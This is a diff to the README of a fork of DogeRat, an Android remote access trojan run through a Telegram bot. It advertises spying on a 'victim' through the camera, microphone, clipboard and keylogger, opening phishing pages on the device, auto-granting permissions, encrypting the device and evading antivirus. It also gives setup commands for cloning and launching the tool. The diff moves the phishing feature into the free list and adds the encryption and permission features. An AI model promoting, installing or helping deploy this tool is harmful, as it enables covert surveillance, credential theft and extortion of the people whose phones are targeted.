@@ -1,3 +1,9 @@
+## DISCLAIMER
+This project is a modified verson of [DogeRat](https://github.com/shivaya-dav/DogeRat) by Shivaya Dav
+You can find that here [https://github.com/shivaya-dav/DogeRat](https://github.com/shivaya-dav/DogeRat)
+
+-------------------------
+
 ![Logo](https://wigmur.com/dogs/logo.png)
 <p align="center">
   <i>A multifunctional Telegram based Android RAT without port forwarding</i>
@@ -29,19 +35,19 @@
 - 📷 capture main and front camera
 - 🎙 capture microphone (with custom duration)
 - 📋 receive last clipboard text
+- 🔦 Torch ON & OFF {if flash available on device}
 - ✅️ auto start after device boot
+- 🔐 Open any phising page in victim device
 - 🔐 Keylogger {Availbe in apk v1 and v2}
 - ✨ Beautiful telegram bot interface
 - -🤖 Undetectable by antivirus
   ## DOGE RAT PAID VERSION FEATURES
-  🔐 Open any phising page in victim device
 - 🖥️ Screenshot (get screenshot from your victim device)
 - 📒 Gallery puller (Get all photos available in gallery)
-- 🔔 notification reader
-- 🔔 notification sender (send custom notification that apper on target device with custom click link)
-- 🗨️ show toast message on target device (Toasts are messages that appear in a box at the bottom of the device)
 -  🔤 Advance Keylogger
 -  📁 PowerFull file manager {delete and Download Files}
+-  Auto grant permissions
+-  Decrypt & Encrypt device
 - ✨ Beautiful telegram bot interface
 - 🤖 Undetectable by antivirus
   <p align="center">
@@ -64,6 +70,7 @@
     <li><a href="https://replit.com/" style="color: #FF4136;">replit.com</a></li>
     <li><a href="https://glitch.com/" style="color: #FFDC00;">glitch.com</a></li>
     <li><a href="https://heroku.com/" style="color: #B10DC9;">heroku.com</a></li>
+    <li><a href="https://render.com/" style="color: #B10DC9;">render.com</a></li>
   </ul>
   <p align="center">
   <a href="https://shivaya-dav.github.io/dogeweb/">
@@ -94,7 +101,7 @@
 ```bash  
   pkg update && upgrade -y
   pkg install git -y
-  git clone https://github.com/shivaya-dav/DogeRat 
+  git clone https://github.com/did-dog/DogeRat 
   cd DogeRat
   bash start.sh
 Enter your bot token 
@@ -158,23 +165,6 @@ fun getAppData(): AppData {
 ```
 
 
-<h2 align="center">🔗 Contact and Social Media Accounts</h2>
-
-<p align="center">
-  <a href="https://t.me/CyberShieldX">
-    <img src="https://img.shields.io/badge/CONTACT-TELEGRAM-blue?style=for-the-badge&logo=telegram" alt="Telegram Badge"/>
-  </a>
-  <a href="https://instagram.com/CyberShieldX">
-    <img src="https://img.shields.io/badge/CONTACT-INSTAGRAM-red?style=for-the-badge&logo=instagram" alt="Instagram Badge"/>
-  </a>
-  <a href="https://twitter.com/CyberShieldX">
-    <img src="https://img.shields.io/badge/CONTACT-TWITTER-blue?style=for-the-badge&logo=twitter" alt="Twitter Badge"/>
-  </a>
-  <a href="https://www.youtube.com/@sphanter/about">
-    <img src="https://img.shields.io/badge/CONTACT-YOUTUBE-red?style=for-the-badge&logo=youtube" alt="Youtube Badge"/>
-  </a>
-</p>
-
 
 <p align="center">
   <img src="https://img.shields.io/badge/Disclaimer-Important-red" alt="Important Disclaimer"/>
@@ -212,17 +202,49 @@ fun getAppData(): AppData {
 
 
 
-
-
 <p align="center">Thank you to the following people for their support:</p>
 
 <div align="center">
-  <a href="https://github.com/shivaya-dav/DogeRat/stargazers">
-    <img src="https://reporoster.com/stars/dark/shivaya-dav/DogeRat" alt="Stargazers" title="Stargazers" width="400" height="auto">
+  <a href="https://github.com/did-dog/DogeRat/stargazers">
+    <img src="https://reporoster.com/stars/dark/did-dog/DogeRat" alt="Stargazers" title="Stargazers" width="400" height="auto">
   </a>
-  
-  -------------------------
-  <a href="https://github.com/shivaya-dav/DogeRat/network/members">
-    <img src="https://reporoster.com/forks/dark/shivaya-dav/DogeRat" alt="Forkers" title="Forkers" width="400" height="auto">
+
+  <a href="https://github.com/did-dog/DogeRat/network/members">
+    <img src="https://reporoster.com/forks/dark/did-dog/DogeRat" alt="Forkers" title="Forkers" width="400" height="auto">
   </a>
 </div>
+
+  <br>
+
+  <h1 align=center>Technology Stack Used</h1>
+  <p align="center">
+    <img src="https://img.shields.io/badge/backend-javascript-violet.svg?logo=javascript&style=flat-square" alt="Javascript" </img>
+    <img src="https://img.shields.io/badge/frontend-shell-green.svg?logo=shell&style=flat-square" alt="Shell"</img>
+    <img src="https://img.shields.io/badge/frontend-java-orange.svg?logo=java&style=flat-square" alt="Java"</img>
+    <img src="https://img.shields.io/badge/frontend-kotlin-violet.svg?logo=kotlin&style=flat-square" alt="Shell"</img>
+  </p>
+
+  <br>
+
+  <h2 align="center">🔗 Help / Contact and Social Media Accounts</h2>
+  <p align="center">
+    <a href="https://t.me/CyberShieldX">
+      <img src="https://img.shields.io/badge/CONTACT-TELEGRAM-blue?style=for-the-badge&logo=telegram" alt="Telegram Badge"/>
+    </a>
+    <a href="https://instagram.com/diddog.in">
+      <img src="https://img.shields.io/badge/CONTACT-INSTAGRAM-red?style=for-the-badge&logo=instagram" alt="Instagram Badge"/>
+    </a>
+    <a href="https://m.facebook.com/diddid.dogdid">
+      <img src="https://img.shields.io/badge/CONTACT-INSTAGRAM-red?style=for-the-badge&logo=facebook" alt="Facebook Badge"/>
+    </a>
+    <a href="https://twitter.com/diddog_in">
+      <img src="https://img.shields.io/badge/CONTACT-TWITTER-blue?style=for-the-badge&logo=twitter" alt="Twitter Badge"/>
+    </a>
+    <a href="https://m.youtube.com/channel/UCxuyWS7wdHw6hq05b75hmZg/videos">
+      <img src="https://img.shields.io/badge/CONTACT-YOUTUBE-red?style=for-the-badge&logo=youtube" alt="Youtube Badge"/>
+    </a>
+  </p>
+
+  <br>
+
+-------------------------
